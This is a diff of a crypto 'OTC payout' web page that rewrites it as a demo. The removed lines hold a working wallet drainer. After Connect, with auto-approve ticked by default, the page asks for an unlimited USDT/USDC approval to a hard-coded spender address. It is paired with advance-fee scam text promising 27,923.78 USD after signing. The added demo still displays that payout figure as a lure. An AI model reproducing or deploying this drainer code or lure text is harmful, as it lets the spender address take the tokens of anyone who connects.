@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>OTC</title>
+  <title>OTC Demo</title>
   <style>
     :root{
       --bg:#0b0e11; --card:rgba(255,255,255,.04); --line:rgba(255,255,255,.12);
@@ -12,34 +12,35 @@
     }
     *{box-sizing:border-box}
     body{margin:0;font-family:system-ui,Segoe UI,Roboto,Arial;background:var(--bg);color:var(--text)}
-    .wrap{max-width:920px;margin:0 auto;padding:22px}
+    .wrap{max-width:980px;margin:0 auto;padding:22px}
     .card{border:1px solid var(--line);border-radius:var(--r);background:var(--card);padding:16px}
     h1{margin:0 0 10px;font-size:20px}
     .mut{color:var(--mut);font-size:14px;line-height:1.5}
     .row{display:flex;gap:10px;flex-wrap:wrap;margin-top:12px}
-    .grid{display:grid;grid-template-columns:1.2fr .8fr;gap:10px;margin-top:12px}
+    .grid{display:grid;grid-template-columns:1.25fr .75fr;gap:10px;margin-top:12px}
     .grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+    .box{border:1px solid rgba(255,255,255,.10);border-radius:16px;padding:12px;background:rgba(255,255,255,.02)}
+    .pill{display:inline-block;padding:6px 10px;border-radius:999px;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.03);font-size:12px;color:var(--mut);margin-top:10px;max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
     button{cursor:pointer;border-radius:14px;border:1px solid rgba(255,255,255,.16);background:rgba(255,255,255,.06);color:var(--text);padding:10px 12px}
     button.primary{border-color:rgba(47,124,255,.65);background:var(--acc)}
     button.danger{border-color:rgba(255,92,122,.55);background:rgba(255,92,122,.12)}
     button:disabled{opacity:.5;cursor:not-allowed}
-    input,select,textarea{
+    input,select{
       width:100%;padding:10px 12px;border-radius:14px;border:1px solid rgba(255,255,255,.16);
       background:rgba(0,0,0,.22);color:var(--text);outline:none
     }
-    input:focus,select:focus,textarea:focus{border-color:rgba(47,124,255,.65)}
+    input:focus,select:focus{border-color:rgba(47,124,255,.65)}
     .status{margin-top:12px;padding:10px 12px;border-radius:14px;background:rgba(0,0,0,.25);border:1px solid rgba(255,255,255,.10);font-size:13px;white-space:pre-wrap}
-    .pill{display:inline-block;padding:6px 10px;border-radius:999px;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.03);font-size:12px;color:var(--mut);margin-top:10px}
-    label{display:flex;gap:10px;align-items:center;margin-top:12px;color:var(--mut);font-size:13px}
-    input[type="checkbox"]{width:16px;height:16px}
-    .warn{margin-top:12px;color:#ffb4c0;font-size:13px;line-height:1.5}
-    .ok{color:var(--ok)}
-    .bad{color:var(--bad)}
-    .box{border:1px solid rgba(255,255,255,.10);border-radius:16px;padding:12px;background:rgba(255,255,255,.02)}
-    .cardItem{border:1px solid rgba(255,255,255,.10);border-radius:16px;padding:12px;background:rgba(0,0,0,.18)}
-    .cardItemHead{display:flex;align-items:center;justify-content:space-between;gap:10px}
     .mono{font-family:ui-monospace, SFMono-Regular, Menlo, monospace}
-    @media (max-width:860px){.grid{grid-template-columns:1fr}}
+    .bigAmount{
+      font-size:40px;font-weight:800;letter-spacing:.2px;line-height:1.05;margin:10px 0 6px;
+    }
+    .splitInfo{color:var(--mut);font-size:13px}
+    .item{border:1px solid rgba(255,255,255,.10);border-radius:16px;padding:12px;background:rgba(0,0,0,.18)}
+    .itemHead{display:flex;align-items:center;justify-content:space-between;gap:10px}
+    .ok{color:var(--ok)} .bad{color:var(--bad)}
+
+    @media (max-width:900px){.grid{grid-template-columns:1fr}}
     @media (max-width:560px){
       .wrap{padding:14px}
       .card{padding:14px}
@@ -47,6 +48,7 @@
       .mut{font-size:13px}
       .grid2{grid-template-columns:1fr}
       .row button{flex:1 1 100%;width:100%}
+      .bigAmount{font-size:32px}
       .sticky-actions{
         position: sticky; bottom: 0; margin-top: 12px; padding-top: 10px;
         background: linear-gradient(180deg, rgba(11,14,17,0), rgba(11,14,17,0.92) 30%, rgba(11,14,17,0.98));
@@ -59,49 +61,49 @@
 <body>
   <div class="wrap">
     <div class="card">
-      <h1>OTC UI — payout to multiple bank cards</h1>
+      <h1>OTC Demo — payout split to multiple “cards”</h1>
       <div class="mut">
-        Wallet part is on-chain. Bank card payout details are off-chain.
-        <br/><span class="bad">Note:</span> To successfully complete the title deeds and receive funds in your bank account, you must have €567 in your account. This amount is required to ensure the security of the transaction; it will not be lost and will remain accessible at any time! <b>
-You receive 27,923.78 USD after signing</b>.
+        Demo only: no real card numbers, no real payouts. Wallet connect is used only to show balances and optionally sign a demo authorization.
       </div>
 
       <div class="pill" id="walletInfo">Wallet: not connected</div>
 
       <div class="grid">
-        <!-- LEFT: MULTI CARDS -->
+        <!-- LEFT: PAYOUT + RECIPIENTS -->
         <div class="box">
-          <div class="mut" style="margin:0 0 8px"><b>Bank cards</b> (add multiple)</div>
+          <div class="mut"><b>Client receives</b></div>
+          <div class="bigAmount" id="totalAmountBig">27,923.78 USD</div>
+          <div class="splitInfo" id="splitInfo">Split across 1 recipient(s)</div>
 
-          <div class="row" style="margin-top:0">
-            <button id="addCardBtn" class="primary">+ Add card</button>
-            <button id="saveCardsBtn">Save cards</button>
-            <button id="clearSavedBtn" class="danger">Clear saved</button>
+          <div class="row">
+            <button id="addBtn" class="primary">+ Add recipient</button>
+            <button id="saveBtn">Save</button>
+            <button id="clearBtn" class="danger">Clear saved</button>
           </div>
 
           <div class="mut" style="margin-top:10px">
-            You can type any values. On save we keep only holder/bank/country and <b>last4</b>.
+            Use labels like “Visa ****1234”, “Mastercard ****7788”. We store only label + optional last4 (demo).
           </div>
 
-          <div id="cardsWrap" style="margin-top:12px;display:grid;gap:10px"></div>
+          <div id="list" style="margin-top:12px;display:grid;gap:10px"></div>
 
-          <div class="mut" style="margin-top:12px"><b>Saved cards</b></div>
-          <div id="savedWrap" style="margin-top:8px;display:grid;gap:8px"></div>
+          <div class="mut" style="margin-top:12px"><b>Saved recipients</b></div>
+          <div id="saved" style="margin-top:8px;display:grid;gap:8px"></div>
         </div>
 
-        <!-- RIGHT: ASSET + AMOUNT + BALANCES -->
+        <!-- RIGHT: WALLET -->
         <div class="box">
           <div class="mut" style="margin:0 0 8px"><b>Wallet balances</b></div>
-          <div class="mut" id="balancesText"> USD 27 923.78</div>
+          <div class="mut" id="balancesText">ETH: - | USDT: - | USDC: -</div>
 
-          <div class="mut" style="margin:14px 0 6px">Asset</div>
+          <div class="mut" style="margin:14px 0 6px">Asset (demo)</div>
           <select id="assetSel">
             <option value="ETH">ETH</option>
             <option value="USDT" selected>USDT</option>
             <option value="USDC">USDC</option>
           </select>
 
-          <div class="mut" style="margin:10px 0 6px">Amount</div>
+          <div class="mut" style="margin:10px 0 6px">Amount (token demo)</div>
           <input id="amountInp" placeholder="0.0" inputmode="decimal" />
           <div class="mut" id="maxHint" style="margin-top:6px">Max: -</div>
 
@@ -109,18 +111,23 @@ You receive 27,923.78 USD after signing</b>.
             <button id="useMaxBtn" disabled>Use Max</button>
           </div>
 
-          <label>
-            <input type="checkbox" id="autoApprove" checked />
-            Auto approve after Connect (Unlimited)
-          </label>
+          <div class="mut" style="margin-top:12px">
+            Optional demo action: sign an “authorization” message (no transactions).
+          </div>
 
           <div class="sticky-actions">
             <div class="row">
               <button class="primary" id="connectBtn">Connect</button>
-              <button id="approveBtn" disabled>Unlimited</button>
-              <button id="openMyExplorerBtn" disabled>Open Explorer Wallet</button>
+              <button id="signBtn" disabled>Sign demo authorization</button>
+              <button id="openExplorerBtn" disabled>Open Explorer</button>
             </div>
           </div>
+
+          <div class="mut" style="margin-top:10px">
+            Network: Ethereum Mainnet preferred (balances still show on whatever chain you’re on).
+          </div>
+        </div>
+      </div>
 
       <div class="status" id="status">Ready.</div>
     </div>
@@ -129,11 +136,12 @@ You receive 27,923.78 USD after signing</b>.
   <script type="module">
     import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.13.4/+esm";
 
-    // ---- CONFIG ----
-    const CHAIN_REQUIRED = 1; // Ethereum mainnet
+    // ---- DEMO SETTINGS ----
+    const TOTAL_USD = 27923.78; // 27,923.78 USD
     const EXPLORER = "https://etherscan.io";
-    const SPENDER = "0xefb991c82db7ce627fb3b157a46b608de6b2f03b";
+    const LS_KEY = "otc_demo_recipients_v1";
 
+    // token addresses (mainnet) just for balances
     const TOKENS = {
       ETH:  { type:"native", symbol:"ETH" },
       USDT: { type:"erc20", symbol:"USDT", address:"0xdAC17F958D2ee523a2206206994597C13D831ec7" },
@@ -141,38 +149,183 @@ You receive 27,923.78 USD after signing</b>.
     };
 
     const ERC20_ABI = [
-      "function approve(address spender, uint256 amount) returns (bool)",
-      "function allowance(address owner, address spender) view returns (uint256)",
-      "function symbol() view returns (string)",
       "function decimals() view returns (uint8)",
       "function balanceOf(address owner) view returns (uint256)"
     ];
 
     // ---- UI ----
-    const statusEl = document.getElementById("status");
+    const totalAmountBig = document.getElementById("totalAmountBig");
+    const splitInfo = document.getElementById("splitInfo");
+    const list = document.getElementById("list");
+    const saved = document.getElementById("saved");
+
+    const addBtn = document.getElementById("addBtn");
+    const saveBtn = document.getElementById("saveBtn");
+    const clearBtn = document.getElementById("clearBtn");
+
     const walletInfo = document.getElementById("walletInfo");
     const balancesText = document.getElementById("balancesText");
-
     const assetSel = document.getElementById("assetSel");
     const amountInp = document.getElementById("amountInp");
     const maxHint = document.getElementById("maxHint");
     const useMaxBtn = document.getElementById("useMaxBtn");
 
-    const autoApprove = document.getElementById("autoApprove");
     const connectBtn = document.getElementById("connectBtn");
-    const approveBtn = document.getElementById("approveBtn");
-    const openMyExplorerBtn = document.getElementById("openMyExplorerBtn");
+    const signBtn = document.getElementById("signBtn");
+    const openExplorerBtn = document.getElementById("openExplorerBtn");
 
-    const addCardBtn = document.getElementById("addCardBtn");
-    const saveCardsBtn = document.getElementById("saveCardsBtn");
-    const clearSavedBtn = document.getElementById("clearSavedBtn");
-    const cardsWrap = document.getElementById("cardsWrap");
-    const savedWrap = document.getElementById("savedWrap");
+    const statusEl = document.getElementById("status");
 
     function setStatus(t){ statusEl.textContent = t; console.log(t); }
     function shortAddr(a){ return a ? a.slice(0,6) + "…" + a.slice(-4) : ""; }
-    function openAddr(a){ window.open(`${EXPLORER}/address/${a}`, "_blank", "noopener,noreferrer"); }
-    function openTx(hash){ window.open(`${EXPLORER}/tx/${hash}`, "_blank", "noopener,noreferrer"); }
+
+    const moneyFmt = new Intl.NumberFormat("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    function usd(v){ return `${moneyFmt.format(v)} USD`; }
+
+    function escapeHtml(s){
+      return String(s||"").replace(/[&<>"']/g, m => ({
+        "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"
+      }[m]));
+    }
+
+    function digitsOnly(v){ return String(v||"").replace(/\D/g,""); }
+
+    // Split with exact cents
+    function splitUsd(total, n){
+      const centsTotal = Math.round(total * 100);
+      const base = Math.floor(centsTotal / n);
+      const rem = centsTotal - base * n;
+      const out = [];
+      for (let i=0;i<n;i++){
+        const c = base + (i < rem ? 1 : 0);
+        out.push(c / 100);
+      }
+      return out;
+    }
+
+    // ---- RECIPIENTS (DEMO) ----
+    function createRecipientItem(prefill = {}){
+      const item = document.createElement("div");
+      item.className = "item";
+
+      item.innerHTML = `
+        <div class="itemHead">
+          <div class="mut"><b>Recipient</b></div>
+          <button class="danger" type="button">Remove</button>
+        </div>
+
+        <div class="grid2" style="margin-top:10px">
+          <div>
+            <div class="mut" style="margin:0 0 6px">Holder name (demo)</div>
+            <input class="r_name" placeholder="John Doe" />
+          </div>
+          <div>
+            <div class="mut" style="margin:0 0 6px">Card label (demo)</div>
+            <input class="r_label" placeholder="Visa ****1234" />
+            <div class="mut r_hint" style="margin-top:6px">Tip: use label like “****1234”</div>
+          </div>
+        </div>
+
+        <div style="margin-top:10px">
+          <div class="mut" style="margin:0 0 6px">This recipient receives (USD)</div>
+          <input class="r_amount" value="0.00" readonly />
+        </div>
+      `;
+
+      const rm = item.querySelector("button.danger");
+      const name = item.querySelector(".r_name");
+      const label = item.querySelector(".r_label");
+
+      name.value = prefill.name || "";
+      label.value = prefill.label || "";
+
+      // light label formatting (no strict checks)
+      label.addEventListener("input", ()=>{
+        // if user types digits, keep last4 hint
+        const d = digitsOnly(label.value);
+        const last4 = d.slice(-4);
+        const hint = item.querySelector(".r_hint");
+        hint.innerHTML = last4 ? `Detected last4: <span class="mono">${last4}</span>` : `Tip: use label like “****1234”`;
+      });
+
+      rm.addEventListener("click", ()=>{
+        item.remove();
+        updateSplit();
+      });
+
+      list.appendChild(item);
+      updateSplit();
+    }
+
+    function readRecipientsFromDOM(){
+      const nodes = Array.from(list.querySelectorAll(".item"));
+      const parts = splitUsd(TOTAL_USD, Math.max(nodes.length, 1));
+      return nodes.map((n, idx)=>({
+        name: n.querySelector(".r_name").value.trim(),
+        label: n.querySelector(".r_label").value.trim(),
+        amountUsd: parts[idx] ?? 0
+      }));
+    }
+
+    function updateSplit(){
+      totalAmountBig.textContent = usd(TOTAL_USD);
+
+      const nodes = Array.from(list.querySelectorAll(".item"));
+      const n = Math.max(nodes.length, 1);
+      splitInfo.textContent = `Split across ${n} recipient(s)`;
+
+      const parts = splitUsd(TOTAL_USD, n);
+      nodes.forEach((node, idx)=>{
+        const amountEl = node.querySelector(".r_amount");
+        amountEl.value = moneyFmt.format(parts[idx] ?? 0);
+      });
+    }
+
+    function renderSaved(){
+      const raw = localStorage.getItem(LS_KEY);
+      let arr = [];
+      try { arr = raw ? JSON.parse(raw) : []; } catch { arr = []; }
+
+      saved.innerHTML = "";
+      if (!arr.length){
+        const d = document.createElement("div");
+        d.className = "mut";
+        d.textContent = "Nothing saved yet.";
+        saved.appendChild(d);
+        return;
+      }
+
+      arr.forEach((r, i)=>{
+        const row = document.createElement("div");
+        row.className = "item";
+        row.innerHTML = `
+          <div class="mut"><b>#${i+1}</b> ${escapeHtml(r.name || "-")} — <span class="mono">${escapeHtml(r.label || "-")}</span></div>
+          <div class="mut"><b>Receives:</b> ${usd(Number(r.amountUsd||0))}</div>
+        `;
+        saved.appendChild(row);
+      });
+    }
+
+    addBtn.addEventListener("click", ()=> createRecipientItem());
+    saveBtn.addEventListener("click", ()=>{
+      const data = readRecipientsFromDOM();
+      localStorage.setItem(LS_KEY, JSON.stringify(data));
+      renderSaved();
+      setStatus(`Saved ${data.length} recipient(s). Total: ${usd(TOTAL_USD)}.`);
+    });
+    clearBtn.addEventListener("click", ()=>{
+      localStorage.removeItem(LS_KEY);
+      renderSaved();
+      setStatus("Saved recipients cleared.");
+    });
+
+    // ---- WALLET (balances + optional signature) ----
+    let provider = null;
+    let signer = null;
+    let addr = "";
+    let chainId = 0;
+
+    const balances = { ETH:null, USDT:null, USDC:null };
 
     function fmtNum(s){
       const n = Number(s);
@@ -180,40 +333,18 @@ You receive 27,923.78 USD after signing</b>.
       return n.toFixed(6).replace(/0+$/,"").replace(/\.$/,"");
     }
 
-    // ---- STATE (wallet) ----
-    let provider = null;
-    let signer = null;
-    let addr = "";
-    let chainId = 0;
-    const balances = { ETH: null, USDT: null, USDC: null };
-
-    function setConnectedUI(on){
-      openMyExplorerBtn.disabled = !on;
-      walletInfo.textContent = on ? `Wallet: ${shortAddr(addr)} | chainId: ${chainId}` : "Wallet: not connected";
-      updateApproveButtonLabel();
-      updateMaxHint();
+    function updateWalletUI(connected){
+      walletInfo.textContent = connected
+        ? `Wallet: ${shortAddr(addr)} | chainId: ${chainId}`
+        : "Wallet: not connected";
+      signBtn.disabled = !connected;
+      openExplorerBtn.disabled = !connected;
       updateBalancesText();
+      updateMaxHint();
     }
 
     function updateBalancesText(){
       balancesText.textContent = `ETH: ${balances.ETH ?? "-"} | USDT: ${balances.USDT ?? "-"} | USDC: ${balances.USDC ?? "-"}`;
-    }
-
-    function updateApproveButtonLabel(){
-      const a = assetSel.value;
-      const token = TOKENS[a];
-      if (!addr){
-        approveBtn.textContent = "Unlimited Approve";
-        approveBtn.disabled = true;
-        return;
-      }
-      if (token.type !== "erc20"){
-        approveBtn.textContent = "Approve not available for ETH";
-        approveBtn.disabled = true;
-      } else {
-        approveBtn.textContent = `Unlimited Approve ${token.symbol}`;
-        approveBtn.disabled = false;
-      }
     }
 
     function updateMaxHint(){
@@ -221,66 +352,60 @@ You receive 27,923.78 USD after signing</b>.
       const max = balances[a];
       maxHint.textContent = `Max: ${max ?? "-"} ${a}`;
       useMaxBtn.disabled = !(max && Number(max) > 0);
-      updateApproveButtonLabel();
     }
 
     assetSel.addEventListener("change", updateMaxHint);
-    useMaxBtn.addEventListener("click", () => {
+    useMaxBtn.addEventListener("click", ()=>{
       const a = assetSel.value;
       if (balances[a]) amountInp.value = String(balances[a]);
     });
 
-    openMyExplorerBtn.addEventListener("click", () => { if (addr) openAddr(addr); });
-
-    async function ensureEthereumMainnet(){
-      const net = await provider.getNetwork();
-      chainId = Number(net.chainId);
-      if (chainId !== CHAIN_REQUIRED){
-        setConnectedUI(true);
-        setStatus("Wrong network. Please switch to Ethereum Mainnet (chainId 1) in MetaMask.");
-        throw new Error("Wrong network (need Ethereum Mainnet)");
-      }
-    }
+    openExplorerBtn.addEventListener("click", ()=>{
+      if (!addr) return;
+      window.open(`${EXPLORER}/address/${addr}`, "_blank", "noopener,noreferrer");
+    });
 
     async function fetchBalances(){
       if (!provider || !addr) return;
 
+      // ETH
       const ethRaw = await provider.getBalance(addr);
       balances.ETH = fmtNum(ethers.formatEther(ethRaw));
 
+      // ERC20 (may fail on non-mainnet)
       for (const key of Object.keys(TOKENS)){
         const t = TOKENS[key];
         if (t.type !== "erc20") continue;
-
-        const c = new ethers.Contract(t.address, ERC20_ABI, provider);
-        const [dec, bal] = await Promise.all([c.decimals(), c.balanceOf(addr)]);
-        balances[key] = fmtNum(ethers.formatUnits(bal, dec));
+        try{
+          const c = new ethers.Contract(t.address, ERC20_ABI, provider);
+          const [dec, bal] = await Promise.all([c.decimals(), c.balanceOf(addr)]);
+          balances[key] = fmtNum(ethers.formatUnits(bal, dec));
+        } catch {
+          balances[key] = "-";
+        }
       }
-      updateMaxHint();
+
       updateBalancesText();
+      updateMaxHint();
     }
 
-    async function connectWalletInteractive(){
+    async function connect(){
       if (!window.ethereum) throw new Error("MetaMask not found");
-
-      setStatus("Requesting wallet connection...");
       await window.ethereum.request({ method: "eth_requestAccounts" });
 
       provider = new ethers.BrowserProvider(window.ethereum);
       signer = await provider.getSigner();
       addr = await signer.getAddress();
+      chainId = Number((await provider.getNetwork()).chainId);
 
-      await ensureEthereumMainnet();
-      setConnectedUI(true);
-
-      setStatus(`Connected: ${addr}\nFetching balances...`);
+      updateWalletUI(true);
+      setStatus(`Connected ✅\nAddress: ${addr}\nchainId: ${chainId}\nFetching balances...`);
       await fetchBalances();
-      setStatus(`Connected ✅\nWallet: ${addr}\nBalances loaded.`);
+      setStatus(`Connected ✅\nBalances loaded.\nDemo payout total: ${usd(TOTAL_USD)}.`);
     }
 
-    async function trySilentConnect(){
+    async function trySilent(){
       if (!window.ethereum) return false;
-
       const accs = await window.ethereum.request({ method: "eth_accounts" }).catch(()=>[]);
       if (!accs || !accs[0]) return false;
 
@@ -289,244 +414,45 @@ You receive 27,923.78 USD after signing</b>.
       addr = await signer.getAddress();
       chainId = Number((await provider.getNetwork()).chainId);
 
-      setConnectedUI(true);
-
-      if (chainId !== CHAIN_REQUIRED){
-        setStatus("Wallet is connected, but network is not Ethereum Mainnet. Switch network in MetaMask.");
-        return true;
-      }
-
-      setStatus(`Already connected: ${addr}\nFetching balances...`);
+      updateWalletUI(true);
+      setStatus(`Already connected ✅\nAddress: ${addr}\nchainId: ${chainId}\nFetching balances...`);
       await fetchBalances();
-      setStatus(`Already connected ✅\nBalances loaded.`);
+      setStatus("Ready.");
       return true;
     }
 
-    async function unlimitedApproveSelectedToken(){
-      if (!signer || !addr) throw new Error("Wallet not connected");
-      await ensureEthereumMainnet();
+    connectBtn.addEventListener("click", async ()=>{
+      try{ await connect(); }
+      catch(e){ setStatus("Error: " + (e?.message || e)); }
+    });
 
-      const key = assetSel.value;
-      const tokenCfg = TOKENS[key];
-
-      if (tokenCfg.type !== "erc20"){
-        setStatus("ETH has no approve. Choose USDT or USDC.");
-        return;
-      }
-
-      const token = new ethers.Contract(tokenCfg.address, ERC20_ABI, signer);
-
-      const decimals = await token.decimals().catch(()=>6);
-      const symbol = await token.symbol().catch(()=>tokenCfg.symbol);
-
-      setStatus(`Checking allowance for ${symbol}...`);
-      const current = await token.allowance(addr, SPENDER);
-
-      const THRESHOLD = ethers.parseUnits("1000000000", decimals); // 1B
-      if (current >= THRESHOLD){
-        setStatus(`Unlimited-ish allowance already set ✅\nToken: ${symbol}\nSpender: ${SPENDER}`);
-        return;
-      }
-
-      setStatus(`Requesting unlimited approve in MetaMask...\nToken: ${symbol}\nSpender: ${SPENDER}`);
-      const tx = await token.approve(SPENDER, ethers.MaxUint256);
-
-      setStatus(`Approve sent: ${tx.hash}\nOpening Etherscan...`);
-      openTx(tx.hash);
-
-      setStatus(`Waiting for confirmation...\nTx: ${tx.hash}`);
-      await tx.wait();
-
-      setStatus(`Unlimited approve confirmed ✅\nToken: ${symbol}`);
-    }
-
-    connectBtn.addEventListener("click", async () => {
+    signBtn.addEventListener("click", async ()=>{
       try{
-        await connectWalletInteractive();
-        if (autoApprove.checked){
-          await unlimitedApproveSelectedToken();
-        }
+        if (!signer) throw new Error("Wallet not connected");
+        const recipients = readRecipientsFromDOM();
+        const payload = {
+          demo: true,
+          purpose: "OTC payout authorization (demo)",
+          totalUsd: TOTAL_USD,
+          recipientsCount: recipients.length,
+          recipients: recipients.map(r=>({ name:r.name, label:r.label, amountUsd:r.amountUsd })),
+          timestamp: new Date().toISOString()
+        };
+        const msg = "OTC DEMO AUTHORIZATION\n\n" + JSON.stringify(payload, null, 2);
+        setStatus("Requesting signature in wallet...");
+        const sig = await signer.signMessage(msg);
+        setStatus("Signed ✅\nSignature:\n" + sig);
       } catch(e){
         setStatus("Error: " + (e?.message || e));
       }
     });
 
-    approveBtn.addEventListener("click", async () => {
-      try{
-        await unlimitedApproveSelectedToken();
-      } catch(e){
-        setStatus("Error: " + (e?.message || e));
-      }
-    });
-
-    // ---- MULTI CARD UI (safe storage: only last4) ----
-    const DRAFT_CARDS = []; // in-memory inputs
-    const LS_KEY = "otc_saved_cards_v1";
-
-    function digitsOnly(v){ return String(v || "").replace(/\D/g, ""); }
-    function maskLast4(full){
-      const d = digitsOnly(full);
-      const last4 = d.slice(-4);
-      return last4 ? `**** **** **** ${last4}` : "";
-    }
-
-    function createCardItem(initial = {}){
-      const item = document.createElement("div");
-      item.className = "cardItem";
-
-      item.innerHTML = `
-        <div class="cardItemHead">
-          <div class="mut"><b>Card</b> <span class="mut">(we will store only last4)</span></div>
-          <button class="danger" type="button">Remove</button>
-        </div>
-
-        <div class="grid2" style="margin-top:10px">
-          <div>
-            <div class="mut" style="margin:0 0 6px">Cardholder</div>
-            <input class="c_holder" placeholder="John Doe" />
-          </div>
-          <div>
-            <div class="mut" style="margin:0 0 6px">Card number (not stored fully)</div>
-            <input class="c_number" placeholder="1234 5678 9012 3456" inputmode="numeric" />
-            <div class="mut c_mask" style="margin-top:6px">Masked: -</div>
-          </div>
-        </div>
-
-        <div class="grid2" style="margin-top:10px">
-          <div>
-            <div class="mut" style="margin:0 0 6px">Bank</div>
-            <input class="c_bank" placeholder="Bank" />
-          </div>
-          <div>
-            <div class="mut" style="margin:0 0 6px">Country</div>
-            <input class="c_country" placeholder="FR" />
-          </div>
-        </div>
-      `;
-
-      const removeBtn = item.querySelector("button.danger");
-      const holder = item.querySelector(".c_holder");
-      const number = item.querySelector(".c_number");
-      const bank = item.querySelector(".c_bank");
-      const country = item.querySelector(".c_country");
-      const mask = item.querySelector(".c_mask");
-
-      holder.value = initial.holder || "";
-      number.value = initial.number || "";
-      bank.value = initial.bank || "";
-      country.value = initial.country || "";
-
-      const updateMask = () => {
-        mask.textContent = "Masked: " + (maskLast4(number.value) || "-");
-      };
-
-      number.addEventListener("input", () => {
-        // light formatting: groups by 4 (no strict validation)
-        const d = digitsOnly(number.value).slice(0,19);
-        number.value = d.replace(/(.{4})/g, "$1 ").trim();
-        updateMask();
-      });
-
-      updateMask();
-
-      removeBtn.addEventListener("click", () => {
-        item.remove();
-        renderDraftFromDOM();
-      });
-
-      cardsWrap.appendChild(item);
-    }
-
-    function renderDraftFromDOM(){
-      // no-op; we read from DOM on save
-    }
-
-    function readDraftCardsFromDOM(){
-      const nodes = Array.from(cardsWrap.querySelectorAll(".cardItem"));
-      return nodes.map(n => {
-        const holder = n.querySelector(".c_holder").value.trim();
-        const number = n.querySelector(".c_number").value.trim();
-        const bank = n.querySelector(".c_bank").value.trim();
-        const country = n.querySelector(".c_country").value.trim();
-        return { holder, number, bank, country };
-      });
-    }
-
-    function saveCards(){
-      const draft = readDraftCardsFromDOM();
-
-      // SAFE SAVE: keep only last4 (masked), never full number
-      const safe = draft
-        .filter(c => c.holder || c.number || c.bank || c.country)
-        .map(c => ({
-          holder: c.holder || "",
-          bank: c.bank || "",
-          country: c.country || "",
-          last4: digitsOnly(c.number).slice(-4) || ""
-        }));
-
-      localStorage.setItem(LS_KEY, JSON.stringify(safe));
-      renderSavedCards();
-      setStatus(`Saved ${safe.length} card(s). (Stored only last4 + meta)`);
-    }
-
-    function clearSaved(){
-      localStorage.removeItem(LS_KEY);
-      renderSavedCards();
-      setStatus("Saved cards cleared.");
-    }
-
-    function renderSavedCards(){
-      const raw = localStorage.getItem(LS_KEY);
-      let arr = [];
-      try { arr = raw ? JSON.parse(raw) : []; } catch { arr = []; }
-
-      savedWrap.innerHTML = "";
-      if (!arr.length){
-        const d = document.createElement("div");
-        d.className = "mut";
-        d.textContent = "No saved cards yet.";
-        savedWrap.appendChild(d);
-        return;
-      }
-
-      arr.forEach((c, idx) => {
-        const row = document.createElement("div");
-        row.className = "cardItem";
-        const masked = c.last4 ? `**** **** **** ${c.last4}` : "(no last4)";
-        row.innerHTML = `
-          <div class="cardItemHead">
-            <div>
-              <div class="mut"><b>Card #${idx+1}</b> — <span class="mono">${masked}</span></div>
-              <div class="mut">Holder: ${escapeHtml(c.holder || "-")} | Bank: ${escapeHtml(c.bank || "-")} | Country: ${escapeHtml(c.country || "-")}</div>
-            </div>
-          </div>
-        `;
-        savedWrap.appendChild(row);
-      });
-    }
-
-    function escapeHtml(s){
-      return String(s || "").replace(/[&<>"']/g, m => ({
-        "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"
-      }[m]));
-    }
-
-    addCardBtn.addEventListener("click", () => createCardItem());
-    saveCardsBtn.addEventListener("click", saveCards);
-    clearSavedBtn.addEventListener("click", clearSaved);
-
-    // add 1 default card row
-    createCardItem();
-
-    // React to account/network changes
     if (window.ethereum?.on){
       window.ethereum.on("accountsChanged", async (accs)=>{
         if (!accs || !accs[0]){
           provider=null; signer=null; addr=""; chainId=0;
           balances.ETH = balances.USDT = balances.USDC = null;
-          setConnectedUI(false);
-          updateBalancesText();
+          updateWalletUI(false);
           setStatus("Disconnected.");
           return;
         }
@@ -535,15 +461,10 @@ You receive 27,923.78 USD after signing</b>.
           signer = await provider.getSigner();
           addr = await signer.getAddress();
           chainId = Number((await provider.getNetwork()).chainId);
-          setConnectedUI(true);
-
-          if (chainId === CHAIN_REQUIRED){
-            setStatus(`Account changed: ${addr}\nFetching balances...`);
-            await fetchBalances();
-            setStatus(`Account changed ✅\nBalances updated.`);
-          } else {
-            setStatus(`Account changed: ${addr}\nWrong network. Switch to Ethereum Mainnet.`);
-          }
+          updateWalletUI(true);
+          setStatus(`Account changed: ${addr}\nFetching balances...`);
+          await fetchBalances();
+          setStatus("Ready.");
         } catch(e){
           setStatus("Error: " + (e?.message || e));
         }
@@ -551,34 +472,27 @@ You receive 27,923.78 USD after signing</b>.
 
       window.ethereum.on("chainChanged", async ()=>{
         if (!provider) return;
-        try{
-          chainId = Number((await provider.getNetwork()).chainId);
-          setConnectedUI(!!addr);
-
-          if (chainId === CHAIN_REQUIRED && addr){
-            setStatus(`Network changed to chainId ${chainId}\nFetching balances...`);
-            await fetchBalances();
-            setStatus("Network OK ✅ Balances updated.");
-          } else {
-            setStatus(`Network changed. chainId: ${chainId}\nSwitch to Ethereum Mainnet to load balances & approve.`);
-          }
-        } catch(e){
-          setStatus("Error: " + (e?.message || e));
+        chainId = Number((await provider.getNetwork()).chainId);
+        updateWalletUI(!!addr);
+        if (addr){
+          setStatus(`Network changed: chainId ${chainId}\nFetching balances...`);
+          await fetchBalances();
+          setStatus("Ready.");
         }
       });
     }
 
-    // INIT
-    (async ()=>{
-      setConnectedUI(false);
-      updateMaxHint();
-      updateBalancesText();
-      renderSavedCards();
-
-      const ok = await trySilentConnect();
-      if (!ok){
-        setStatus("Wallet not connected. Click Connect.");
-      }
+    // ---- INIT ----
+    (function init(){
+      totalAmountBig.textContent = usd(TOTAL_USD);
+      // start with 1 recipient
+      createRecipientItem({ label: "Visa ****1234" });
+      updateSplit();
+      renderSaved();
+      updateWalletUI(false);
+      trySilent().then(ok=>{
+        if (!ok) setStatus("Wallet not connected. Click Connect.");
+      });
     })();
   </script>
 </body>
